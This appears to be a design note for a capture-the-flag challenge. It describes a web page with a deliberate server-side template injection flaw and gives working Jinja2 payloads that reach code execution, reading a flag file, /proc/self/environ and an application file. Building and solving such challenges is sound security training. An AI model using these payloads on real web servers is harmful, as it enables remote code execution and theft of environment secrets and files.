```
--> Challenge 4  : On the Web Page there will be an option to Send a Message to Any User (SSTI). Outbound Connection will be closed and read privelleges will be rovided for /home/final.txt:

					Enter the Username to Send a Message

This value shall be reflected on the URL and webpage like :

   					http://ctfchallenge.awesome:8080/admin/sendmessage?user= <input_by_the_candidate>

   					Resetting Password for user <SSTI_Response>

This is where there shall be a SSTI bug and exploiting it could gain the candidate RCE on the WEBSERVER.

				   http://ctfchallenge.awesome:8080/admin/sendmessage?user={{7*'7'}}
				   Resetting Password for user 7777777


After gaining the RCE /home/final.txt would be the final flag.

					http://ctfchallenge.awesome:8080/admin/sendmessage?user={{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat /home/final.txt').read() }}
					Resetting Password for user <Contents of /home/final.txt>

```

expolit : 

/buy/{{ "foo".__class__.__base__.__subclasses__()[370].__init__.__globals__['sys'].modules['os'].popen("cat /proc/self/environ").read() }}
/buy/{{ "foo".__class__.__base__.__subclasses__()[370].__init__.__globals__['sys'].modules['os'].popen("cat /srv/http/app2/src/required_file").read() }}
